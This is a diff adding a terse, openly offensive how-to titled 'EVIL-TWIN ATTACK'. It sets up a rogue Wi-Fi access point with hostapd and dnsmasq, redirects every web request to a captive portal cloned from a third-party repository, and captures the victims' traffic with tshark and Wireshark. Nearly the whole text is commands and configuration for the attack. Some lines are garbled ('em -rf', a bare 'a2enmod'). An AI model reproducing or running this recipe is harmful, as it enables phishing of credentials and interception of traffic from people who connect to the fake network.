@@ -1,0 +1,57 @@
+EVIL-TWIN ATTACK
+
+apt install dnsmasq hostapd
+
+airmon-ng check kill
+
+leafpad /etc/apache2/sites-enabled/000-default.conf
+
+add this text:
+<Directory "/var/www/html">
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ / [L,QSA]
+</Directory>
+
+a2enmod
+
+service apache2 start
+
+
+dnsmasq -C /root/dnsmasq.conf
+
+
+hostapd /root/hostapd.conf -B
+
+ifconfig wlan0 <ipasyouwish>/24
+
+git clone https://github.com/s0meguy1/RougeWifi.git
+
+cd RougeWifi
+
+em -rf wifi.sh
+
+cp -r * /var/www/html
+
+restart system
+
+airmon-ng check kill
+
+service apache2 start
+
+dnsmasq -C /root/dnsmasq.conf
+
+hostapd /root/hostapd.conf -B
+
+ifconfig wlan0 <ip>/24
+
+Signinto new wifi network created
+
+tshark -i wlan0 -w capture.cap
+
+wireshark capture.cap
